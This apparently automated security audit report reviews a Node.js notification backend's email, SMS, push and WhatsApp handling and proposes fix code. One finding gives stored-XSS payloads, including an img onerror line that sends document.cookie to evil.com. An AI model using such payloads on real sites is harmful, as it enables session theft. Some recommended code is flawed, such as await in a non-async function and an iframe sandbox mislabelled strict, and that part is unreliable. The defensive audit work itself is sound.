# Notification System Security Audit Report
## Traf3li Backend - Comprehensive Security Analysis

**Audit Date:** 2025-12-22
**Repository:** https://github.com/mischa23v/traf3li-backend
**Auditor:** Security Analysis Tool
**Scope:** Email, SMS, WhatsApp, Push Notifications, Content Sanitization, Privacy

---

## Executive Summary

This security audit reveals **CRITICAL vulnerabilities** in the notification system that could lead to:
- **XSS attacks** via unsanitized notification content
- **Information disclosure** through error messages and logs
- **Privacy violations** from unencrypted sensitive data
- **Spam/abuse** due to insufficient rate limiting
- **API key exposure** risks
- **SSRF attacks** via webhook endpoints

**Risk Level:** 🔴 **CRITICAL** (9.2/10)

---

## 1. Email Notification Security Analysis

### Files Analyzed
- `/src/services/email.service.js`
- `/src/services/emailTemplate.service.js`
- `/src/services/notificationDelivery.service.js`
- `/src/models/smtpConfig.model.js`

### ✅ Security Strengths

1. **Content Sanitization**
   - Uses `sanitize-html` library for HTML content
   - Mustache template auto-escaping with `{{variable}}` syntax
   - Dedicated sanitization functions in `emailTemplate.service.js`

2. **Rate Limiting**
   - Implements 1 email per hour per user rate limit
   - In-memory rate limit tracking
   - Prevents email spam and blacklisting

3. **Template Security**
   - Pre-sanitized HTML content fields
   - Whitelist of allowed HTML tags and attributes
   - Safe URL schemes (http, https, mailto)

### 🔴 CRITICAL Vulnerabilities

#### **VULN-EMAIL-001: API Key Exposure Risk**
**Severity:** CRITICAL
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Location:** `/src/services/email.service.js:16`
```javascript
const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;
```

**Issue:** API key loaded from environment but:
- No validation of API key format
- No key rotation mechanism
- API key could be logged in error messages
- No monitoring for unauthorized API usage

**Recommendation:**
```javascript
// Validate API key format
const RESEND_API_KEY = process.env.RESEND_API_KEY;
if (RESEND_API_KEY && !RESEND_API_KEY.startsWith('re_')) {
  throw new Error('Invalid Resend API key format');
}

// Add key rotation date tracking
const API_KEY_ROTATION_DATE = process.env.API_KEY_ROTATION_DATE;
if (!API_KEY_ROTATION_DATE || isKeyExpired(API_KEY_ROTATION_DATE)) {
  console.warn('API key rotation required');
}

// Never log API keys
const resend = RESEND_API_KEY ? new Resend(RESEND_API_KEY) : null;
```

---

#### **VULN-EMAIL-002: Insufficient Email Address Validation**
**Severity:** HIGH
**CWE:** CWE-20 (Improper Input Validation)

**Location:** `/src/services/email.service.js:100-107`

**Issue:** No validation of recipient email addresses:
- No format validation
- No domain verification
- No disposable email detection
- Could send to invalid/malicious addresses

**Recommendation:**
```javascript
const validator = require('validator');
const dns = require('dns').promises;

async function validateEmail(email) {
  // Format validation
  if (!validator.isEmail(email)) {
    throw new Error('Invalid email format');
  }

  // Extract domain
  const domain = email.split('@')[1];

  // DNS MX record verification
  try {
    await dns.resolveMx(domain);
  } catch (error) {
    throw new Error('Email domain does not exist or has no MX records');
  }

  // Check disposable email list
  const disposableDomains = ['tempmail.com', 'guerrillamail.com'];
  if (disposableDomains.includes(domain)) {
    throw new Error('Disposable email addresses not allowed');
  }

  return true;
}
```

---

#### **VULN-EMAIL-003: OTP Email Rate Limit Bypass**
**Severity:** HIGH
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Location:** `/src/services/notificationDelivery.service.js:325-367`

**Issue:** OTP emails bypass rate limiting entirely:
```javascript
static async sendEmailOTP(email, otpCode, userName = 'User') {
  // NO rate limit check - OTP is critical for login
  // OTP has its own rate limiting in EmailOTP model
```

This allows:
- Email bombing attacks
- Bypass of general rate limiting
- Potential spam abuse
- Resource exhaustion

**Recommendation:**
- Implement separate OTP-specific rate limiting (5 OTPs per hour)
- Track OTP requests in database, not just in-memory
- Add exponential backoff for repeated OTP requests
- Implement CAPTCHA for excessive OTP requests

---

#### **VULN-EMAIL-004: Missing SPF/DKIM/DMARC Configuration**
**Severity:** MEDIUM
**CWE:** CWE-358 (Improperly Implemented Security Check)

**Issue:** No mention of email authentication mechanisms:
- No SPF record verification
- No DKIM signing verification
- No DMARC policy enforcement
- Emails could be spoofed/rejected

**Recommendation:**
- Configure SPF records for sending domain
- Enable DKIM signing in Resend
- Implement DMARC policy (p=reject)
- Monitor DMARC reports for abuse

---

#### **VULN-EMAIL-005: Information Disclosure in Error Messages**
**Severity:** MEDIUM
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Location:** Multiple locations

**Issue:** Detailed error messages logged/returned:
```javascript
console.log(`✓ Email sent successfully to ${to}: ${subject}`);
console.error(`✗ Failed to send email to ${to}:`, error.message);
```

Leaks:
- Email addresses in logs
- Subject lines (could contain sensitive info)
- API error details
- User identification

**Recommendation:**
```javascript
// Hash email addresses in logs
const emailHash = crypto.createHash('sha256').update(to).digest('hex').substring(0, 8);
console.log(`✓ Email sent successfully to ${emailHash}: [subject redacted]`);

// Generic error messages to users
console.error(`✗ Failed to send email to ${emailHash}: Generic error`);
```

---

#### **VULN-EMAIL-006: No Content Security Policy for Email HTML**
**Severity:** MEDIUM
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Issue:** Email HTML templates lack CSP headers:
- No protection against email client XSS
- No restriction on external resources
- No frame-ancestors directive

**Recommendation:**
Add CSP meta tags to email templates:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               img-src 'self' https: data:;
               style-src 'self' 'unsafe-inline';
               script-src 'none';">
```

---

## 2. SMS Notification Security Analysis

### Files Analyzed
- `/src/services/notificationDelivery.service.js`
- `/src/services/whatsapp.service.js`

### 🔴 CRITICAL Vulnerabilities

#### **VULN-SMS-001: No SMS Implementation - Stub Only**
**Severity:** CRITICAL
**CWE:** CWE-749 (Exposed Dangerous Method or Function)

**Location:** `/src/services/notificationDelivery.service.js:226-251`

**Issue:** SMS functionality is a stub:
```javascript
static async sendSMS(options) {
  const { to, message } = options;

  // Check if SMS provider is configured
  if (!process.env.TWILIO_ACCOUNT_SID && !process.env.MSG91_AUTH_KEY) {
    console.warn('⚠️ SMS provider not configured. SMS not sent.');
    return {
      success: false,
      stub: true
    };
  }

  // TODO: Implement when SMS provider is configured
  console.log(`📱 SMS stub: Would send to ${to}: ${message}`);
```

**Risks:**
- Users think SMS is enabled but messages never send
- No security controls in place when implemented
- No phone number validation
- No rate limiting
- No content sanitization

---

#### **VULN-SMS-002: Missing Phone Number Validation**
**Severity:** HIGH
**CWE:** CWE-20 (Improper Input Validation)

**Location:** `/src/services/whatsapp.service.js:1241-1264`

**Issue:** Basic phone validation only:
```javascript
validatePhoneNumber(phone) {
  // Remove all non-numeric characters
  let cleaned = phone.replace(/\D/g, '');

  // Saudi Arabia format: +966XXXXXXXXX
  if (cleaned.startsWith('966')) {
    return cleaned;
  }
  // ... simple prefix checks
}
```

**Missing:**
- International phone number validation library (libphonenumber)
- Valid phone number range verification
- Carrier lookup
- Number type detection (mobile vs landline)
- Spam number blacklist

**Recommendation:**
```javascript
const { parsePhoneNumber, isValidPhoneNumber } = require('libphonenumber-js');

validatePhoneNumber(phone, country = 'SA') {
  try {
    const phoneNumber = parsePhoneNumber(phone, country);

    if (!phoneNumber.isValid()) {
      throw new Error('Invalid phone number');
    }

    if (phoneNumber.getType() !== 'MOBILE') {
      throw new Error('Only mobile numbers allowed');
    }

    // Check spam blacklist
    if (await isPhoneSpam(phoneNumber.number)) {
      throw new Error('Phone number blocked');
    }

    return phoneNumber.number;
  } catch (error) {
    throw new Error(`Phone validation failed: ${error.message}`);
  }
}
```

---

#### **VULN-SMS-003: No SMS Content Sanitization**
**Severity:** HIGH
**CWE:** CWE-79 (XSS via SMS)

**Issue:** SMS content not sanitized before sending:
- Could contain control characters
- Could contain phishing links
- No GSM 7-bit encoding validation
- Could cause SMS splitting issues

**Recommendation:**
```javascript
function sanitizeSMSContent(message) {
  // Remove control characters
  let cleaned = message.replace(/[\x00-\x1F\x7F-\x9F]/g, '');

  // Validate GSM 7-bit charset or convert to Unicode
  const gsm7bitChars = /^[@£$¥èéùìòÇ\nØø\rÅåΔ_ΦΓΛΩΠΨΣΘΞÆæßÉ !"#¤%&'()*+,\-./0-9:;<=>?¡A-ZÄÖÑÜ§¿a-zäöñüà]*$/;

  if (!gsm7bitChars.test(cleaned)) {
    // Convert to Unicode SMS
    cleaned = cleaned.substring(0, 70); // Unicode SMS limit
  } else {
    cleaned = cleaned.substring(0, 160); // GSM 7-bit limit
  }

  // Validate and sanitize URLs
  const urlPattern = /(https?:\/\/[^\s]+)/g;
  cleaned = cleaned.replace(urlPattern, (url) => {
    return sanitizeUrl(url);
  });

  return cleaned;
}
```

---

#### **VULN-SMS-004: No SMS Rate Limiting**
**Severity:** CRITICAL
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Issue:** No rate limiting for SMS:
- Could send unlimited SMS messages
- High cost abuse risk
- Potential for SMS bombing attacks
- No daily/monthly quota enforcement

**Recommendation:**
```javascript
// Implement SMS rate limiting
const SMS_RATE_LIMITS = {
  perUser: { max: 10, window: 3600000 }, // 10 SMS per hour
  perPhone: { max: 5, window: 3600000 }, // 5 SMS per phone per hour
  global: { max: 1000, window: 86400000 } // 1000 SMS per day globally
};

async function checkSMSRateLimit(userId, phoneNumber) {
  const redis = getRedisClient();

  // Check per-user limit
  const userKey = `sms:user:${userId}`;
  const userCount = await redis.incr(userKey);
  if (userCount === 1) {
    await redis.expire(userKey, SMS_RATE_LIMITS.perUser.window / 1000);
  }
  if (userCount > SMS_RATE_LIMITS.perUser.max) {
    throw new Error('User SMS rate limit exceeded');
  }

  // Check per-phone limit
  const phoneKey = `sms:phone:${phoneNumber}`;
  const phoneCount = await redis.incr(phoneKey);
  if (phoneCount === 1) {
    await redis.expire(phoneKey, SMS_RATE_LIMITS.perPhone.window / 1000);
  }
  if (phoneCount > SMS_RATE_LIMITS.perPhone.max) {
    throw new Error('Phone SMS rate limit exceeded');
  }

  // Check global limit
  const globalKey = 'sms:global';
  const globalCount = await redis.incr(globalKey);
  if (globalCount === 1) {
    await redis.expire(globalKey, SMS_RATE_LIMITS.global.window / 1000);
  }
  if (globalCount > SMS_RATE_LIMITS.global.max) {
    throw new Error('Global SMS quota exceeded');
  }

  return true;
}
```

---

## 3. Push Notification Security Analysis

### Files Analyzed
- `/src/controllers/pushSubscription.controller.js`
- `/src/services/notificationDelivery.service.js`
- `/src/queues/notification.queue.js`

### 🔴 CRITICAL Vulnerabilities

#### **VULN-PUSH-001: VAPID Public Key Exposure**
**Severity:** MEDIUM
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Location:** `/src/controllers/pushSubscription.controller.js:187-212`

**Issue:** VAPID public key exposed via API:
```javascript
const getVapidPublicKey = async (req, res) => {
  const publicKey = process.env.VAPID_PUBLIC_KEY;

  if (!publicKey) {
    return res.status(500).json({
      success: false,
      error: 'VAPID public key not configured'
    });
  }

  res.status(200).json({
    success: true,
    publicKey
  });
};
```

**Risks:**
- While VAPID public keys are meant to be public, exposing via API is unnecessary
- No rate limiting on this endpoint
- Could be scraped/abused
- Information disclosure about push notification setup

**Recommendation:**
- Serve VAPID public key via static file or embed in frontend
- If API needed, add rate limiting
- Add authentication requirement

---

#### **VULN-PUSH-002: No Push Subscription Endpoint Validation**
**Severity:** CRITICAL
**CWE:** CWE-918 (Server-Side Request Forgery - SSRF)

**Location:** `/src/controllers/pushSubscription.controller.js:13-61`

**Issue:** Push subscription endpoint not validated:
```javascript
const savePushSubscription = async (req, res) => {
  const { subscription } = req.body;

  if (!subscription || !subscription.endpoint || !subscription.keys) {
    return res.status(400).json({
      success: false,
      error: 'Invalid subscription data'
    });
  }

  // NO validation of endpoint URL
  await User.findByIdAndUpdate(userId, {
    pushSubscription: {
      endpoint: subscription.endpoint,  // Could be malicious URL
      keys: { ... }
    }
  });
};
```

**Risks:**
- Attacker could set endpoint to internal network URL
- SSRF attack when push notification sent
- Could probe internal services
- Could exfiltrate data

**Recommendation:**
```javascript
const { URL } = require('url');

function validatePushEndpoint(endpoint) {
  try {
    const url = new URL(endpoint);

    // Only allow HTTPS
    if (url.protocol !== 'https:') {
      throw new Error('Push endpoint must use HTTPS');
    }

    // Whitelist of allowed push service domains
    const allowedDomains = [
      'fcm.googleapis.com',
      'updates.push.services.mozilla.com',
      'updates-autopush.stage.mozaws.net',
      'updates-autopush.dev.mozaws.net',
      'notify.windows.com',
      'push.apple.com'
    ];

    const isAllowed = allowedDomains.some(domain =>
      url.hostname === domain || url.hostname.endsWith(`.${domain}`)
    );

    if (!isAllowed) {
      throw new Error('Push endpoint domain not allowed');
    }

    // Prevent private IP ranges
    const hostname = url.hostname;
    if (isPrivateIP(hostname)) {
      throw new Error('Private IP addresses not allowed');
    }

    return true;
  } catch (error) {
    throw new Error(`Invalid push endpoint: ${error.message}`);
  }
}
```

---

#### **VULN-PUSH-003: No Push Content Sanitization**
**Severity:** HIGH
**CWE:** CWE-79 (Cross-Site Scripting)

**Location:** `/src/queues/notification.queue.js:93-99`

**Issue:** Push notification content not sanitized:
```javascript
const payload = JSON.stringify({
  title,      // Not sanitized
  body,       // Not sanitized
  icon: icon || '/icon.png',
  badge: badge || '/badge.png',
  data: notificationData || {}  // Not sanitized
});
```

**Risks:**
- XSS in push notification title/body
- Malicious data payloads
- Script injection when notification clicked
- Browser notification API exploitation

**Recommendation:**
```javascript
const sanitize = require('../utils/sanitize');

function sanitizePushPayload(title, body, data) {
  return {
    title: sanitize.stripHtml(title).substring(0, 100),
    body: sanitize.stripHtml(body).substring(0, 300),
    icon: sanitizeUrl(icon),
    badge: sanitizeUrl(badge),
    data: sanitizeObjectDeep(data)
  };
}

function sanitizeObjectDeep(obj) {
  if (typeof obj !== 'object' || obj === null) return obj;

  const sanitized = {};
  for (const [key, value] of Object.entries(obj)) {
    // Only allow safe keys
    if (!/^[a-zA-Z0-9_]+$/.test(key)) continue;

    if (typeof value === 'string') {
      sanitized[key] = sanitize.stripHtml(value);
    } else if (typeof value === 'number' || typeof value === 'boolean') {
      sanitized[key] = value;
    } else if (typeof value === 'object') {
      sanitized[key] = sanitizeObjectDeep(value);
    }
  }
  return sanitized;
}
```

---

#### **VULN-PUSH-004: Expired Subscription Not Cleaned Up**
**Severity:** MEDIUM
**CWE:** CWE-404 (Improper Resource Shutdown)

**Location:** `/src/queues/notification.queue.js:114-125`

**Issue:** Expired subscriptions marked but not removed:
```javascript
// If subscription is invalid, mark it for removal
if (error.statusCode === 410) {
  console.warn(`Push subscription expired for user ${userId}`);
  return {
    success: false,
    expired: true,
    error: 'Subscription expired'
  };
}
```

**Recommendation:**
```javascript
if (error.statusCode === 410) {
  // Remove expired subscription from database
  const User = require('../models/user.model');
  await User.findByIdAndUpdate(userId, {
    $unset: { pushSubscription: 1 }
  });

  console.warn(`Push subscription expired and removed for user ${userId}`);
  return { success: false, expired: true, error: 'Subscription expired' };
}
```

---

## 4. Notification Content Sanitization Analysis

### Files Analyzed
- `/src/utils/sanitize.js`
- `/src/services/emailTemplate.service.js`
- `/src/controllers/notification.controller.js`

### ✅ Security Strengths

1. **Comprehensive Sanitization Library**
   - Dedicated `sanitize.js` utility
   - Multiple sanitization levels (rich text, comment, plain)
   - RTL/Arabic support

2. **HTML Sanitization**
   - Uses `sanitize-html` library
   - Whitelist-based approach
   - Safe URL schemes

### 🔴 CRITICAL Vulnerabilities

#### **VULN-SANITIZE-001: Notification Controller Doesn't Sanitize Input**
**Severity:** CRITICAL
**CWE:** CWE-79 (Stored XSS)

**Location:** `/src/controllers/notification.controller.js:159-179`

**Issue:** Notification creation accepts unsanitized input:
```javascript
const createNotification = async (notificationData) => {
  try {
    const notification = new Notification(notificationData);  // No sanitization
    await notification.save();

    emitNotification(notificationData.userId, notification.toObject());
    // ...
  }
};
```

**Attack Vector:**
```javascript
// Malicious notification data
const maliciousNotification = {
  userId: 'victim123',
  type: 'message',
  title: '<script>alert(document.cookie)</script>',
  message: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
  link: 'javascript:alert(1)'
};
```

**Recommendation:**
```javascript
const sanitize = require('../utils/sanitize');

const createNotification = async (notificationData) => {
  try {
    // Sanitize all user-provided fields
    const sanitizedData = {
      ...notificationData,
      title: sanitize.stripHtml(notificationData.title),
      message: sanitize.sanitizeComment(notificationData.message),
      link: sanitizeUrl(notificationData.link),
      data: sanitizeObject(notificationData.data)
    };

    const notification = new Notification(sanitizedData);
    await notification.save();

    // Emit sanitized notification
    emitNotification(sanitizedData.userId, notification.toObject());
  } catch (error) {
    console.error('Error creating notification:', error);
    return null;
  }
};
```

---

#### **VULN-SANITIZE-002: WhatsApp Service No Content Sanitization**
**Severity:** HIGH
**CWE:** CWE-79 (XSS)

**Location:** `/src/services/whatsapp.service.js:146-221`

**Issue:** WhatsApp text messages not sanitized:
```javascript
async sendTextMessage(firmId, phoneNumber, text, options = {}) {
  // ...
  const message = await WhatsAppMessage.create({
    // ...
    content: { text },  // No sanitization
    // ...
  });
}
```

**Risks:**
- WhatsApp formatting codes abuse
- Control character injection
- Phishing link injection
- Unicode homograph attacks

**Recommendation:**
```javascript
function sanitizeWhatsAppText(text) {
  // Remove control characters except newline and tab
  let cleaned = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]/g, '');

  // Limit WhatsApp formatting abuse
  cleaned = cleaned.replace(/(\*|_|~){4,}/g, '$1$1$1');

  // Validate and sanitize URLs
  cleaned = cleaned.replace(/(https?:\/\/[^\s]+)/gi, (url) => {
    try {
      const urlObj = new URL(url);
      // Check for homograph attacks
      if (hasHomographs(urlObj.hostname)) {
        return '[suspicious link removed]';
      }
      return url;
    } catch {
      return '[invalid link removed]';
    }
  });

  // Limit length
  return cleaned.substring(0, 4096);
}
```

---

#### **VULN-SANITIZE-003: Dangerous iFrame Allowed in Rich Text**
**Severity:** HIGH
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Location:** `/src/utils/sanitize.js:104-112`

**Issue:** iFrames allowed with limited hostname whitelist:
```javascript
allowedIframeHostnames: [
  'docs.google.com',
  'drive.google.com',
  'onedrive.live.com',
  'api.traf3li.com',
  'traf3li.com'
],
```

**Risks:**
- Clickjacking attacks
- Embedded malicious content
- Session hijacking via iFrame
- UI redressing attacks

**Recommendation:**
```javascript
// Remove iFrame from allowed tags entirely
allowedTags: [
  // ... other tags
  // 'iframe',  // REMOVE THIS
],

// If iFrames absolutely needed, use strict CSP
transformTags: {
  'iframe': (tagName, attribs) => {
    return {
      tagName: 'iframe',
      attribs: {
        src: attribs.src,
        sandbox: 'allow-scripts allow-same-origin',  // Strict sandbox
        loading: 'lazy',
        referrerpolicy: 'no-referrer',
        // Remove allowfullscreen
      }
    };
  }
}
```

---

## 5. Notification Preference Privacy Analysis

### Files Analyzed
- `/src/models/notificationSettings.model.js`
- `/src/controllers/pushSubscription.controller.js`

### 🔴 CRITICAL Vulnerabilities

#### **VULN-PRIVACY-001: No Encryption of Sensitive Preference Data**
**Severity:** HIGH
**CWE:** CWE-311 (Missing Encryption of Sensitive Data)

**Location:** `/src/models/notificationSettings.model.js:68-87`

**Issue:** Sensitive data stored in plain text:
```javascript
emailAddress: {
  type: String,
  trim: true
},
phoneNumber: {
  type: String,
  trim: true
},
```

**Risks:**
- Email addresses exposed in database dumps
- Phone numbers accessible to database admins
- No protection against database breaches
- Privacy compliance violations (GDPR, PDPL)

**Recommendation:**
```javascript
const crypto = require('crypto');

// Email address field with encryption
emailAddress: {
  type: String,
  get: function(value) {
    if (!value) return value;
    return decryptField(value);
  },
  set: function(value) {
    if (!value) return value;
    return encryptField(value);
  }
},

phoneNumber: {
  type: String,
  get: function(value) {
    if (!value) return value;
    return decryptField(value);
  },
  set: function(value) {
    if (!value) return value;
    return encryptField(value);
  }
},

// Encryption functions
function encryptField(text) {
  const algorithm = 'aes-256-gcm';
  const key = Buffer.from(process.env.FIELD_ENCRYPTION_KEY, 'hex');
  const iv = crypto.randomBytes(16);

  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return JSON.stringify({
    iv: iv.toString('hex'),
    data: encrypted,
    tag: authTag.toString('hex')
  });
}

function decryptField(encrypted) {
  const algorithm = 'aes-256-gcm';
  const key = Buffer.from(process.env.FIELD_ENCRYPTION_KEY, 'hex');

  const { iv, data, tag } = JSON.parse(encrypted);

  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(tag, 'hex'));

  let decrypted = decipher.update(data, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

---

#### **VULN-PRIVACY-002: No Access Control on Notification Settings**
**Severity:** CRITICAL
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Issue:** Users could potentially access/modify other users' settings:
- No validation that userId matches authenticated user
- No authorization checks in update operations
- Potential IDOR vulnerability

**Recommendation:**
```javascript
// Add middleware to verify user owns the settings
const verifySettingsOwnership = async (req, res, next) => {
  const authenticatedUserId = req.user._id || req.user.userId;
  const requestedUserId = req.params.userId || req.body.userId;

  // User can only access their own settings
  if (authenticatedUserId.toString() !== requestedUserId?.toString()) {
    return res.status(403).json({
      success: false,
      error: 'Access denied',
      errorAr: 'الوصول مرفوض'
    });
  }

  next();
};

// Apply to all notification settings routes
router.put('/notification-preferences', verifySettingsOwnership, updateNotificationPreferences);
```

---

#### **VULN-PRIVACY-003: Push Subscription Stored Without Encryption**
**Severity:** HIGH
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Location:** `/src/controllers/pushSubscription.controller.js:36-45`

**Issue:** Push subscription keys stored in plain text:
```javascript
await User.findByIdAndUpdate(userId, {
  pushSubscription: {
    endpoint: subscription.endpoint,
    keys: {
      p256dh: subscription.keys.p256dh,  // Plain text
      auth: subscription.keys.auth        // Plain text
    }
  }
});
```

**Risks:**
- Subscription keys exposed in database
- Could be used to send unauthorized notifications
- Privacy breach if database compromised

**Recommendation:**
- Encrypt subscription keys before storage
- Use separate encryption key for subscriptions
- Consider token-based subscription management

---

#### **VULN-PRIVACY-004: No Audit Logging for Preference Changes**
**Severity:** MEDIUM
**CWE:** CWE-778 (Insufficient Logging)

**Issue:** No logging of notification preference changes:
- Can't track who changed what
- No evidence for privacy compliance
- Can't detect unauthorized changes
- No accountability

**Recommendation:**
```javascript
// Add audit logging for all preference changes
const AuditLog = require('../models/auditLog.model');

const updateNotificationPreferences = async (req, res) => {
  // ... existing code ...

  // Log the change
  await AuditLog.create({
    userId: req.user._id,
    action: 'notification_preferences_updated',
    resource: 'notificationSettings',
    resourceId: userId,
    changes: {
      old: oldPreferences,
      new: updateData
    },
    ipAddress: req.ip,
    userAgent: req.get('user-agent'),
    timestamp: new Date()
  });

  // ... rest of code ...
};
```

---

## 6. Additional Security Vulnerabilities

### **VULN-MISC-001: SSRF in Webhook Notifications**
**Severity:** HIGH
**CWE:** CWE-918 (Server-Side Request Forgery)

**Location:** `/src/queues/notification.queue.js:214-253`

**Issue:** Webhook URL validation exists but could be bypassed:
```javascript
const validationResult = await validateWebhookUrl(webhookUrl, {
  allowHttp: process.env.NODE_ENV !== 'production',
  resolveDNS: true
});
```

**Risks:**
- DNS rebinding attacks
- Time-of-check-time-of-use (TOCTOU) race condition
- Could probe internal network
- Could access cloud metadata endpoints

**Recommendation:**
```javascript
// Add additional SSRF protections
async function sendWebhookNotification(data, job) {
  const { webhookUrl, payload, headers = {} } = data;

  // Validate URL
  const validationResult = await validateWebhookUrl(webhookUrl, {
    allowHttp: process.env.NODE_ENV !== 'production',
    resolveDNS: true,
    blockPrivateIPs: true,
    blockCloudMetadata: true  // Block 169.254.169.254, etc.
  });

  // Use axios with strict timeout and no redirects
  const response = await axios.post(webhookUrl, payload, {
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'Traf3li-Webhook/1.0',
      ...headers
    },
    timeout: 5000,  // Shorter timeout
    maxRedirects: 0,  // No redirects
    validateStatus: (status) => status >= 200 && status < 300,
    // Use custom HTTP agent with no keep-alive
    httpAgent: new http.Agent({
      keepAlive: false,
      maxSockets: 1
    })
  });

  return { success: true, webhookUrl, statusCode: response.status };
}
```

---

### **VULN-MISC-002: No CSRF Protection on Notification Endpoints**
**Severity:** HIGH
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Issue:** Notification endpoints lack CSRF protection:
- POST/PUT/DELETE operations without CSRF tokens
- Could be exploited to change notification settings
- Could enable/disable notifications without user consent

**Recommendation:**
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply CSRF protection to state-changing operations
app.post('/api/users/push-subscription', csrfProtection, savePushSubscription);
app.put('/api/users/notification-preferences', csrfProtection, updateNotificationPreferences);
app.delete('/api/users/push-subscription', csrfProtection, deletePushSubscription);
```

---

### **VULN-MISC-003: Missing Input Length Validation**
**Severity:** MEDIUM
**CWE:** CWE-1284 (Improper Validation of Specified Quantity in Input)

**Issue:** No length limits on notification content:
- Could cause database bloat
- Could cause out-of-memory errors
- Could be used for DoS attacks

**Recommendation:**
```javascript
// Add validation middleware
const validateNotificationInput = (req, res, next) => {
  const { title, message, data } = req.body;

  if (title && title.length > 200) {
    return res.status(400).json({
      success: false,
      error: 'Title too long (max 200 characters)'
    });
  }

  if (message && message.length > 1000) {
    return res.status(400).json({
      success: false,
      error: 'Message too long (max 1000 characters)'
    });
  }

  if (data && JSON.stringify(data).length > 5000) {
    return res.status(400).json({
      success: false,
      error: 'Data payload too large (max 5KB)'
    });
  }

  next();
};
```

---

## 7. Compliance & Privacy Concerns

### GDPR Compliance Issues

1. **Right to Erasure**
   - No mechanism to delete all notification history
   - Push subscriptions not automatically cleaned up
   - Email/phone retained even after account deletion

2. **Data Minimization**
   - Storing full email addresses when hashes could suffice
   - Retaining notification history indefinitely
   - No automatic cleanup of old notifications

3. **Consent Management**
   - No explicit consent tracking for notification channels
   - No granular consent per notification type
   - No consent withdrawal mechanism

### PDPL (Saudi Arabia) Compliance Issues

1. **Data Localization**
   - No verification that notification data stays in Saudi Arabia
   - Third-party services (Resend, Twilio) may store data abroad
   - No data residency controls

2. **Arabic Language Support**
   - Good: Bilingual notifications supported
   - Missing: Arabic-only privacy policies
   - Missing: Arabic consent forms

---

## 8. Recommendations Summary

### Immediate Actions (P0 - Critical)

1. **Sanitize All Notification Content**
   ```javascript
   // Apply to all notification creation points
   - notification.controller.js: createNotification()
   - notificationDelivery.service.js: send()
   - whatsapp.service.js: sendTextMessage()
   - email.service.js: all send functions
   ```

2. **Implement SMS Rate Limiting**
   - Add per-user, per-phone, and global limits
   - Use Redis for distributed rate limiting
   - Add cost monitoring and alerts

3. **Validate Push Subscription Endpoints**
   - Whitelist allowed push service domains
   - Block private IP ranges
   - Prevent SSRF attacks

4. **Add Access Control to Notification Settings**
   - Verify user ownership before any operation
   - Implement RBAC for admin operations
   - Add audit logging

5. **Encrypt Sensitive Preference Data**
   - Encrypt email addresses
   - Encrypt phone numbers
   - Encrypt push subscription keys

### Short Term (P1 - High Priority)

6. **Add CSRF Protection**
   - All POST/PUT/DELETE operations
   - Use double-submit cookie pattern
   - Add SameSite cookie attribute

7. **Implement Proper Email Validation**
   - Format validation
   - DNS MX record verification
   - Disposable email detection
   - Domain reputation checking

8. **Add Content Length Validation**
   - Title: max 200 chars
   - Message: max 1000 chars
   - Data payload: max 5KB
   - Enforce at model and API levels

9. **Fix OTP Rate Limiting**
   - Separate OTP rate limits
   - Database-backed tracking
   - Exponential backoff
   - CAPTCHA for abuse

10. **Clean Up Expired Push Subscriptions**
    - Remove on 410 error
    - Periodic cleanup job
    - Notify user of removal

### Medium Term (P2 - Medium Priority)

11. **Implement Comprehensive Audit Logging**
    - Log all preference changes
    - Log all notification sends
    - Log all failures
    - Retention policy

12. **Add Email Authentication**
    - Configure SPF records
    - Enable DKIM signing
    - Implement DMARC policy
    - Monitor reports

13. **Enhance Phone Number Validation**
    - Use libphonenumber-js
    - Validate number ranges
    - Check carrier lookup
    - Maintain spam blacklist

14. **Remove Dangerous HTML Features**
    - Remove iFrame support
    - Restrict script tags
    - Limit external resources
    - Add CSP headers

15. **Implement Notification Archiving**
    - Auto-delete after 90 days
    - Configurable retention
    - Comply with data minimization
    - Secure deletion process

### Long Term (P3 - Nice to Have)

16. **End-to-End Encryption for Notifications**
    - Encrypt notification content at rest
    - Client-side decryption
    - Key management system

17. **Advanced Threat Detection**
    - ML-based spam detection
    - Anomaly detection
    - Behavioral analysis
    - Automated blocking

18. **Compliance Automation**
    - GDPR/PDPL compliance dashboard
    - Automated consent management
    - Data subject request automation
    - Compliance reporting

19. **Multi-Region Support**
    - Data residency controls
    - Region-specific notification services
    - Compliance per region

20. **Notification Analytics & Monitoring**
    - Delivery rates
    - Open rates
    - Bounce rates
    - Security event monitoring

---

## 9. Security Testing Checklist

### Email Notifications
- [ ] Test XSS in email subject
- [ ] Test XSS in email body
- [ ] Test email address injection
- [ ] Test rate limit bypass
- [ ] Test OTP flooding
- [ ] Test email template injection
- [ ] Test SPF/DKIM/DMARC failures

### SMS Notifications
- [ ] Test phone number validation bypass
- [ ] Test SMS content injection
- [ ] Test rate limit enforcement
- [ ] Test international number handling
- [ ] Test control character injection
- [ ] Test SMS splitting abuse

### Push Notifications
- [ ] Test SSRF via subscription endpoint
- [ ] Test XSS in push title/body
- [ ] Test subscription endpoint validation
- [ ] Test VAPID key exposure
- [ ] Test expired subscription cleanup
- [ ] Test notification data injection

### WhatsApp Notifications
- [ ] Test WhatsApp formatting abuse
- [ ] Test URL injection
- [ ] Test template variable injection
- [ ] Test broadcast rate limiting
- [ ] Test webhook verification bypass

### Privacy & Preferences
- [ ] Test IDOR in preference access
- [ ] Test preference encryption
